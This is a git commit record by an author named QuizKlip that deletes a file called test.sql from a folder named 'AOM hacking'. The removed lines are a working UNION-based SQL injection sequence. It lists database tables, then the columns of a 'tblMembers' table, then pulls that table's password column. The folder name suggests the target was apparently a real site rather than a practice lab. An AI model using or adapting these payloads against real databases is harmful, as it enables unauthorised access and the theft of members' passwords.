dbf4e2368e70f88b0342041ba51d0be57833de6f
QuizKlip <aaron.gostein@gmail.com>
2018-12-25 20:31:40 -0600

    Delete test.sql

--- AOM/AOM hacking/test.sql
+++
@@ -1,6 +0,0 @@
-SELECT ? FROM ? WHERE ? LIKE '%
-' UNION (SELECT 1,TABLE_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM information_schema.tables);#
-'
-' UNION (SELECT 1,COLUMN_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM information_schema.columns WHERE TABLE_NAME='tblMembers');#
-'
-' UNION (SELECT 1,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM tblMembers);#
